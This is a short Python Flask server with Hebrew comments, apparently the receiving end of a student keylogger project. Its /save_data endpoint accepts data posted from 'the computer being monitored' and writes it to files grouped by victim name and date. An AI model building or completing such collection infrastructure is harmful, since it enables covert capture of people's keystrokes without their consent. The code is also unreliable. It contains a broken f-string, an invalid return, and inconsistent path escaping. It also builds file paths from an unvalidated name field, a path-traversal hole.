from flask import Flask,request, jsonify
from fileWriter import FileWriter
from datetime import datetime


#יצרת מופע לשרת
app = Flask(__name__)

#דקרוטור שגורם שמתי שיגיעו אליו הוא יפעיל את הפונקציה הזו
@app.route("/save_data",methods = ["POST"])
def save_data():
    req = request.get_json()  # משתנה שיכיל מילון עם הערכים שיקבל מהמחשב שעליו מבוצע המעקב
    # print(req)
    file_writer = FileWriter()#יצירת מופע למחלקת כתיבה לקובץ
    directory_path = f"C:\\Users\\netan\Desktop\KiLiogerProject\server\\all_data\\{req["name"]}\{req["time"][:10].txt}"
    file_writer.create_directory_if_not_exists(directory_path)
    # הפעלת פונקציה שתשלח את הנתונים הבאים בצורה הבאה לתוך קובץ
    file_writer.send_data(f"[{req["time"]}] {req["data"]}",f"all_data/{req["name"]}/{req["time"][:10]}.txt")
    return  jsonify(req).status # החזרת סטטוס שהדף התקבל ועודכן





def to_str(req):
    a = ""
    for time,data in req.items():
        a += f" {time}: {data}"
    return a

app.run()